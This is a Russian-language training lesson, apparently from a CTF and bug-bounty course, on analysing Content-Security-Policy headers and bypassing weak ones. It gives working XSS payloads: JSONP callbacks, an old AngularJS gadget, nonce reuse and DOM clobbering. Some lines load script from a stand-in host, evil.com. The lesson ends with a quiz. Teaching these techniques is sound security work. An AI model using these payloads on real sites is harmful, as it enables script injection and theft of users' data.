---
id: web-csp-bypass
title: "CSP и его обход"
category: web
parent: web-xss-bypass-advanced
difficulty: medium
order: 1
tags: [csp, bypass, xss, nonce, jsonp, dom-clobbering]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как читать Content-Security-Policy, где он оставляет дыры и как обходить слабые политики до выполнения JS."
---

**CSP (Content Security Policy)** — заголовок, который ограничивает, откуда страница может грузить скрипты, стили, картинки и куда отправлять запросы. Правильный CSP превращает XSS из «выполнил скрипт» в «скрипт не запустился». Но очень часто политика настроена так, что её можно обойти. Умение читать CSP и находить в нём дыры — ключевой навык современного веб-исследователя.

## Теория: как читать CSP

Пример:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com 'nonce-abc123' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

Директивы, важные для XSS:

| Директива | Что ограничивает |
|-----------|------------------|
| `script-src` | откуда можно грузить/выполнять JS |
| `default-src` | fallback для всего |
| `style-src` | CSS (иногда ведёт к data exfil) |
| `connect-src` | куда можно `fetch`/`XHR`/`WebSocket` |
| `img-src` | откуда картинки (утечка данных через src) |
| `base-uri` | можно ли менять `<base>` |
| `form-action` | куда можно отправлять формы |
| `frame-src` / `frame-ancestors` | вложенные фреймы / кто фреймит нас |
| `object-src` | плагины (`<object>`) |

Ключевые «слабые» значения: `'unsafe-inline'` (разрешает инлайн-скрипты), `'unsafe-eval'` (`eval`, `Function`), `data:`/`*` в `script-src`, отсутствие `nonce`/`hash`, а также CSP только в `<meta>` (не работает для `frame-ancestors`).

## Теория: способы обхода

1. **`'unsafe-inline'` + HTML-инъекция** — можно ставить `<script>` напрямую.
2. **Доверенный CDN с JSONP/Angular** — если в `script-src` есть домен, отдающий JSONP (`callback=alert(1)`), вы грузите JS оттуда. Классика: `https://accounts.google.com` (JSONP), `cdnjs` с уязвимой AngularJS-библиотекой.
3. **`nonce` можно предсказать/переиспользовать** — если nonce статичен или взят из cookie, инъекция вставит его.
4. **DOM clobbering** — без исполнения JS переопределить переменные через `<form id=...>`, `<img name=...>`, ломая логику доверенного скрипта.
5. **`base-uri` не задан** — `<base href="//evil.com">` переписывает относительные пути, заставляя доверенные скрипты грузиться с вашего домена.
6. **`script-src 'self'` + загрузка файлов** — если вы можете загрузить JS-файл на тот же origin (upload, JSON с `Content-Type`), CSP пропустит.
7. **Отсутствие `object-src`** → `<object data="data:text/html,...">` в старых движках.
8. **CSP через `<meta>`** — можно раньше вставить свой `<meta>` и ослабить политику (в некоторых сценариях), а `frame-ancestors` в meta вообще игнорируется.
9. **`report-uri`/`report-to`** — иногда сама отчётность создаёт побочные эффекты, но это редкость.

## Инструменты

Посмотреть CSP:

```bash
curl -s -I https://target.local/ | grep -i '^content-security-policy'
```

Разложить директивы по строкам:

```bash
curl -s -I https://target.local/ | grep -io 'content-security-policy:.*' | tr ';' '\n'
```

Онлайн-парсеры: **CSP Evaluator** (Google), **CSP Scanner**. В Burp — расширение **CSP Bypasser** / ручной анализ.

Проверить, инлайн-скрипт выполняется:

```html
<script>alert(document.domain)</script>
```

Если CSP блокирует — в консоли будет `Refused to execute inline script`.

## Разобранный пример: обход через JSONP на доверенном домене

Шаг 1. Читаем CSP:

```
script-src 'self' https://accounts.google.com;
object-src 'none'
```

`'unsafe-inline'` нет, но есть доверенный домен.

Шаг 2. Ищем на `accounts.google.com` JSONP-эндпоинт:

```
https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)
```

Шаг 3. Вставляем в точку инъекции:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
```

Браузер доверяет `accounts.google.com` → скрипт выполняется, CSP обойдён. Это реальная историческая техника (называется «script gadget»). Сегодня нужно искать актуальные JSONP/`callback`-эндпоинты на доменах из `script-src`.

## Разобранный пример: base-uri отсутствует

CSP: `script-src 'self'` без `base-uri`. Инъекция HTML (не JS) позволяет:

```html
<base href="https://evil.com/">
```

Теперь все относительные `<script src="/js/app.js">` грузятся с `evil.com`, а `'self'` считает их «своими»? Нет — `'self'` всё равно ограничит домен; поэтому техника работает, когда скрипты относительные и CSP ослаблен `*` или `https:`. Главное — при отсутствии `base-uri` вы ломаете логику загрузки и можете подсунуть свой скрипт через относительный путь, если политика это допускает. Всегда проверяйте `base-uri`.

## Разобранный пример: nonce переиспользуется

Если сервер ставит один и тот же `nonce` на всех страницах (или берёт из cookie), найдите его в HTML:

```html
<script nonce="d2FyZGVu">...</script>
```

И вставьте свой скрипт с тем же nonce:

```html
<script nonce="d2FyZGVu">alert(1)</script>
```

CSP пропустит, потому что nonce «легитимен». Проверяется повторной загрузкой страницы: если nonce одинаков — он предсказуем.

## Частые ошибки

- **Игнорировать CSP.** Многие payload «не работают» именно из-за CSP; читайте заголовок перед выводами.
- **Забывать про `'unsafe-inline'` + `'unsafe-eval'`.** Их наличие почти всегда = обход.
- **Не смотреть на `script-src` домены.** Каждый доверенный домен — потенциальный script gadget.
- **Путать report-only.** `Content-Security-Policy-Report-Only` ничего не блокирует.
- **Забывать `object-src`/`base-uri`.** Их отсутствие — частые дыры.
- **Не проверять, где CSP.** В `<meta>` он не покрывает `frame-ancestors` и может быть переопределён раньше.

## Полный разбор: обход CSP через JSONP (с выводом)

End-to-end на цель с политикой, разрешающей доверенный домен.

Шаг 1. Читаем заголовок и разбираем директивы:

```bash
curl -s -I https://target.local/ | grep -io 'content-security-policy:.*'
# content-security-policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; object-src 'none'
```

`'unsafe-inline'` нет → инлайн `<script>` заблокирован. Но `script-src` содержит CDN.

Шаг 2. Проверяем инлайн (должен быть заблокирован):

```bash
curl -s 'https://target.local/?q=<script>alert(1)</script>' -o /dev/null -w '%{http_code}\n'
# 200, но в браузере: Refused to execute inline script
```

Шаг 3. Ищем script gadget на домене из `script-src`. Для `cdn.jsdelivr.net` можно загрузить уязвимую библиотеку (например, старую AngularJS, где шаблон исполняется):

```html
<script src="https://cdn.jsdelivr.net/npm/angular@1.4.0/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(document.domain)')()}}</div>
```

CSP доверяет CDN → библиотека грузится → Angular исполняет выражение.

Шаг 4. Если домен отдаёт JSONP — ещё проще:

```html
<script src="https://trusted.example/jsonp?callback=alert(document.domain)//"></script>
```

В выводе консоли: `alert` выполнен, `document.domain` = целевой. CSP обойдён без `'unsafe-inline'`.

## DOM clobbering: атака без JavaScript

Когда `script-src` строг и JS-инъекция невозможна, но HTML-инъекция есть — переопределяем переменные доверенного скрипта через именованные элементы. Например, скрипт делает:

```javascript
var cfg = window.config || {};
loadScript(cfg.url);
```

Инъекция:

```html
<form id="config"><input name="url" value="https://evil.com/x.js"></form>
```

Теперь `window.config` — это HTMLFormElement, `config.url` — ваш input. Доверенный скрипт грузит ваш URL. Другой приём — `id`/`name` перекрывают `document.getElementById`-результат и `window.<name>`. Особенно эффективно против кода, который читает `window.X` без проверки типа.

## Reference-таблица: слабые директивы и обходы

| Слабое место CSP | Обход |
|------------------|-------|
| `'unsafe-inline'` | прямой `<script>`/`onerror=` |
| `'unsafe-eval'` | `eval`, `Function`, `setTimeout('...')` |
| `script-src *` | любой внешний скрипт |
| `script-src https:` | любой HTTPS-домен (JSONP/CDN) |
| доверенный CDN | script gadget / уязвимая библиотека |
| JSONP на доверенном домене | `callback=alert(1)` |
| нет `base-uri` | `<base href="//evil.com">` |
| нет `object-src` | `<object data="data:text/html,...">` |
| nonce статичен/предсказуем | вставить свой `<script nonce=...>` |
| CSP в `<meta>` | не покрывает `frame-ancestors`, можно переопределить раньше |
| `connect-src` не задан | `fetch` на ваш домен для эксфильтрации |

## Строгий CSP (strict-dynamic, nonce) и что остаётся

Современный сильный CSP: `script-src 'nonce-<random>' 'strict-dynamic'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'`. Обойти его сложно, но проверяйте:

- **nonce утекает** в HTML, кешируется, повторяется — тогда переиспользуйте.
- **strict-dynamic** доверяет скриптам, созданным доверенным скриптом — если есть gadget, он может создать ваш скрипт.
- **Trusted Types** ломаются через DOM clobbering и `javascript:`-навигацию.
- **Отсутствие `frame-ancestors`** → кликджекинг.
- **`style-src` без nonce** → CSS-инъекция для утечки (см. `web-css-injection`).

## Что делать дальше / решение

1. **Прочитать CSP** (`curl -I`) и разложить директивы.
2. **Проверить `'unsafe-inline'`/`'unsafe-eval'`** — если есть, прямой payload.
3. **Собрать доверенные домены** из `script-src` и искать на них JSONP/script gadgets.
4. **Нет `base-uri`** → `<base href>` для переписывания путей.
5. **Нет `object-src`** → `<object data=...>`.
6. **Строгий nonce** → искать утечку/повтор nonce, strict-dynamic-gadget.
7. **HTML-инъекция без JS** → DOM clobbering и CSS-эксфильтрация.

## CSP и XSS-аудит: чек-лист

Порядок анализа при найденной HTML-инъекции:

1. **Заголовок есть?** `curl -sI` → `Content-Security-Policy`. Если только `-Report-Only` — политика не блокирует.
2. **`script-src`:** есть ли `'unsafe-inline'`/`'unsafe-eval'`/`*`/`data:`/`https:`? — почти всегда обход.
3. **Доверенные домены:** для каждого ищем JSONP (`?callback=`), уязвимые библиотеки (AngularJS, jQuery-плагины), открытые редиректы, `upload`-эндпоинты.
4. **nonce:** статичен? повторяется между страницами? утекает в HTML/кеше? — переиспользуем.
5. **`base-uri`:** отсутствует → `<base href>`.
6. **`object-src`:** отсутствует → `<object>`.
7. **`connect-src`:** не задан → эксфильтрация `fetch` куда угодно.
8. **`style-src`:** без nonce → CSS-инъекция (утечка через селекторы, см. `web-css-injection`).
9. **strict-dynamic + Trusted Types:** если включены — ищем gadget, который создаст скрипт, и DOM clobbering.
10. **Отчётность:** `report-uri` иногда раскрывает внутренние эндпоинты — смотрим.

Практический приём: соберите политику в Google CSP Evaluator — он подсветит слабые директивы, а затем проверяйте каждую дыру payload'ом.

## Что делать дальше / решение

1. **Прочитать и разложить** CSP.
2. **Найти самую слабую директиву** (unsafe-inline → CDN → JSONP → nonce).
3. **Собрать PoC**, который исполняет `alert(document.domain)` под этой политикой.
4. **Проверить отсутствующие директивы** (`base-uri`, `object-src`, `connect-src`).
5. **Если JS не проходит** — DOM clobbering + CSS-эксфильтрация.
6. **Зафиксировать обход** как доказательство (скриншот консоли + payload + заголовок CSP).

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что делает директива `script-src`?"
  options:
    - "Ограничивает источники загружаемых скриптов"
    - "Задаёт cookie"
    - "Включает HTTPS"
    - "Разрешает CORS"
  answer: 0
  explanation: "`script-src` определяет, откуда можно выполнять JS."
- question: "Какое значение CSP фактически разрешает инлайн-скрипты?"
  options:
    - "`'none'`"
    - "`'unsafe-inline'`"
    - "`'strict-dynamic'`"
    - "`'self'`"
  answer: 1
  explanation: "`'unsafe-inline'` разрешает `<script>` и обработчики прямо в HTML."
- question: "Что такое script gadget?"
  options:
    - "Уязвимость в браузере"
    - "Доверенный домен из CSP, отдающий исполняемый JS (например JSONP)"
    - "Плагин Burp"
    - "Тип nonce"
  answer: 1
  explanation: "Если в `script-src` есть домен с JSONP/callback, через него исполняют JS."
- question: "Зачем нужна директива `base-uri`?"
  options:
    - "Запретить менять `<base>` и переписывать относительные пути"
    - "Разрешить `eval`"
    - "Ограничить формы"
    - "Задать nonce"
  answer: 0
  explanation: "Без неё можно подсунуть `<base href>` и увести загрузку ресурсов."
- question: "Чем отличается `Content-Security-Policy-Report-Only`?"
  options:
    - "Он блокирует ещё сильнее"
    - "Он ничего не блокирует, только сообщает о нарушениях"
    - "Он работает только для стилей"
    - "Он отключает TLS"
  answer: 1
  explanation: "Report-only не применяет политику, лишь логирует."
```

## Где пригодится

- **CTF (Web):** задачи часто дают CSP, который надо обойти через JSONP/nonce/base-uri.
- **Bug bounty:** обход CSP превращает «неэксплуатируемый» XSS в полноценный — большая разница в выплате.
- **Пентест:** анализ CSP — часть оценки защищённости против XSS.
- **Работа (AppSec/Dev):** внедрение строгого CSP с nonce/hash — современный стандарт защиты от XSS.
